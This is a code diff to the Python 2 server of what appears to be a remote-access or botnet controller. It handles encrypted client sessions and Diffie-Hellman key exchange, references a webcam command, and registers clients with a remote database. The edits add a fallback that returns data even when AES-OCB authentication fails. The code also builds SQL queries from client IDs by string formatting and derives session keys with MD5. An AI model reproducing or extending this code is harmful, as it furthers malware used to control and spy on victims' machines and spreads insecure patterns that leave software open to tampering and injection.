@@ -185,17 +185,21 @@ class Server(threading.Thread):
         except Exception as e:
             return "{} error: {}".format(self._get_status.func_name, str(e))
 
-    def _encrypt_aes(self, data, key):
+    def _encrypt_client(self, data, key):
         cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB)
         ciphertext, tag = cipher.encrypt_and_digest(data)
         output = b''.join((cipher.nonce, tag, ciphertext))
         return base64.b64encode(output)
 
-    def _decrypt_aes(self, data, key):
+    def _decrypt_client(self, data, key):
         data = cStringIO.StringIO(base64.b64decode(data))
         nonce, tag, ciphertext = [ data.read(x) for x in (Crypto.Cipher.AES.block_size - 1, Crypto.Cipher.AES.block_size, -1) ]
         cipher = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_OCB, nonce)
-        return cipher.decrypt_and_verify(ciphertext, tag)
+        try:
+            return cipher.decrypt_and_verify(ciphertext, tag)
+        except:
+            return cipher.decrypt(ciphertext) + '\n(Authentication check failed - transmission may have been compromised)\n'
+
 
     def _encrypt_server(self, plaintext, key):
         text        = self._pad(plaintext, Crypto.Cipher.AES.block_size, chr(0))
@@ -236,7 +240,7 @@ class Server(threading.Thread):
             self._error("Invalid Client ID: {}".format(client_id))
             self._return()
         try:
-            return self._encrypt_aes(data, client.session_key)
+            return self._encrypt_client(data, client.session_key)
         except Exception as e:
             self._error("{} error: {}".format(self.encrypt.func_name, str(e)))
 
@@ -249,7 +253,7 @@ class Server(threading.Thread):
             self._error("Invalid Client ID: {}".format(client_id))
             self._return()
         try:
-            return self._decrypt_aes(data, client.session_key)
+            return self._decrypt_client(data, client.session_key)
         except ValueError:
             self._error("{} error: authentication failed - network communication may be compromised".format(self.decrypt.func_name))
         except Exception as e:
@@ -443,12 +447,12 @@ class Server(threading.Thread):
         max_key, max_val = " {:<%d}" % max_k, " {:<%d}" % max_v
         with lock:
             print('\n')
-            print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t.' + '-' * int(max_k + max_v + 3) + colorama.Fore.YELLOW + colorama.Style.DIM + '.')
-            print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t|' + self._text_color + colorama.Style.BRIGHT + ' ' * int(min_k + 1) + 'command <argument>' + ' ' * int(min_k + 1) + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + colorama.Style.BRIGHT + self._text_color + ' ' * int(min_v + 1) + 'description' + ' ' * int(min_v + 1) + colorama.Fore.YELLOW + colorama.Style.DIM + '|') if data else print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t|' + self._text_color + colorama.Style.BRIGHT + ' ' * int(min_k + 1) + 'command <argument>' + ' ' * min_k + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + colorama.Style.BRIGHT + self._text_color + ' ' * int(min_v + 1) + 'description' + ' ' * min_v + colorama.Fore.YELLOW + colorama.Style.DIM + '|')
-            print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t|' + '-' * int(max_k + max_v + 3) + colorama.Fore.YELLOW + colorama.Style.DIM + '|')
+            print(colorama.Fore.YELLOW  + colorama.Style.DIM + '.' + '-' * int(max_k + max_v + 3) + colorama.Fore.YELLOW + colorama.Style.DIM + '.')
+            print(colorama.Fore.YELLOW  + colorama.Style.DIM + '|' + self._text_color + colorama.Style.BRIGHT + ' ' * int(min_k + 1) + 'command <argument>' + ' ' * int(min_k + 1) + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + colorama.Style.BRIGHT + self._text_color + ' ' * int(min_v + 1) + 'description' + ' ' * int(min_v + 1) + colorama.Fore.YELLOW + colorama.Style.DIM + '|') if data else print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t|' + self._text_color + colorama.Style.BRIGHT + ' ' * int(min_k + 1) + 'command <argument>' + ' ' * min_k + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + colorama.Style.BRIGHT + self._text_color + ' ' * int(min_v + 1) + 'description' + ' ' * min_v + colorama.Fore.YELLOW + colorama.Style.DIM + '|')
+            print(colorama.Fore.YELLOW  + colorama.Style.DIM + '|' + '-' * int(max_k + max_v + 3) + colorama.Fore.YELLOW + colorama.Style.DIM + '|')
             for key in sorted(info):
-                print(colorama.Fore.YELLOW  + colorama.Style.DIM + '\t|' + self._text_color + self._text_style + max_key.format(key) + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + self._text_color + max_val.format(str(info[key])) + colorama.Fore.YELLOW + colorama.Style.DIM + '|')
-            print(colorama.Fore.YELLOW  + colorama.Style.DIM + "\t'" + '-' * int(max_k + max_v + 3) + colorama.Fore.YELLOW + colorama.Style.DIM + "'")
+                print(colorama.Fore.YELLOW  + colorama.Style.DIM + '|' + self._text_color + self._text_style + max_key.format(key) + colorama.Fore.YELLOW + colorama.Style.DIM + '|' + self._text_color + max_val.format(str(info[key])) + colorama.Fore.YELLOW + colorama.Style.DIM + '|')
+            print(colorama.Fore.YELLOW  + colorama.Style.DIM + "'" + '-' * int(max_k + max_v + 3) + colorama.Fore.YELLOW + colorama.Style.DIM + "'")
 
     def webcam_client(self, args=''):
         try:
@@ -687,7 +691,7 @@ class ClientHandler(threading.Thread):
         while '\n' not in buf:
             buf += self.connection.recv(1024)
         try:
-            text  = threads['server']._decrypt_aes(buf.rstrip(), self.session_key)
+            text  = threads['server']._decrypt_client(buf.rstrip(), self.session_key)
             data  = json.loads(text.rstrip())
             exist = threads['server'].query_database("SELECT * FROM clients WHERE id='{}'".format(data['id']), display=False)            
             if not exist or len(str(exist)) == 0:
@@ -705,33 +709,31 @@ class ClientHandler(threading.Thread):
             session_id  = requests.post(Server.database['domain'] + Server.database['pages']['session'], data={'id': self.info['id']}).content.strip().rstrip()
             with self.lock:
                 print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "\n\n\n [+] " + colorama.Fore.RESET + "New connection" + colorama.Style.DIM + "\n\n{:>15}\t\t{}\n{:>15} {:>40}\n".format("Client ID", self.name, "Session ID", session_id) + threads['server']._text_color + threads['server']._text_style)
-            ciphertext  = threads['server']._encrypt_aes(session_id, self.session_key)
+            ciphertext  = threads['server']._encrypt_client(session_id, self.session_key)
             self.connection.sendall(ciphertext + '\n')
             ciphertext  = ""
             while "\n" not in ciphertext:
                 ciphertext += self.connection.recv(1024)
-            plaintext   = threads['server']._decrypt_aes(ciphertext.rstrip(), self.session_key)
+            plaintext   = threads['server']._decrypt_client(ciphertext.rstrip(), self.session_key)
             request     = json.loads(plaintext)
             if request.get('request') == 'public_key':
-                response = threads['server']._encrypt_aes(self.public_key.exportKey(), self.session_key)
+                response = threads['server']._encrypt_client(self.public_key.exportKey(), self.session_key)
                 self.connection.sendall(response + '\n')
             return session_id
         except Exception as e:
             self._error("{} returned error: {}".format(self._session.func_name, str(e)))
             self._kill()
 
-    # Diffie-Hellman Internet Key Exchange (IKE) - RFC 2631
     def _session_key(self):
         try:
-            #RFC 3526 MOPD group 14 (2048 bit strong prime)
             p  = 0xFFFFFFFFFFFFFFFFC90FDAA22168C234C4C6628B80DC1CD129024E088A67CC74020BBEA63B139B22514A08798E3404DDEF9519B3CD3A431B302B0A6DF25F14374FE1356D6D51C245E485B576625E7EC6F44C42E9A637ED6B0BFF5CB6F406B7EDEE386BFB5A899FA5AE9F24117C4B1FE649286651ECE45B3DC2007CB8A163BF0598DA48361C55D39A69163FA8FD24CF5F83655D23DCA3AD961C62F356208552BB9ED529077096966D670C354E4ABC9804F1746C08CA18217C32905E462E36CE3BE39E772C180E86039B2783A2EC07A28FB5C55DF06F4C52C9DE2BCBF6955817183995497CEA956AE515D2261898FA051015728E5A8AACAA68FFFFFFFFFFFFFFFF
             a  = Crypto.Util.number.bytes_to_long(os.urandom(32))
             g  = 2
-            Ax = pow(g, a, p)  # Ax = g ^ A mod P
+            Ax = pow(g, a, p)  
             self.connection.send(Crypto.Util.number.long_to_bytes(Ax))
             Bx = Crypto.Util.number.bytes_to_long(self.connection.recv(256))
-            k  = pow(Bx, a, p) # k = Bx ^ A mod P
-            return hashlib.new('md5', Crypto.Util.number.long_to_bytes(k)).hexdigest()
+            k  = pow(Bx, a, p) 
+            return Crypto.Hash.MD5.new(Crypto.Util.number.long_to_bytes(k)).hexdigest()
         except Exception as e:
             self._error("{} returned error: {}".format(self._session_key, str(e)))
             self._kill()
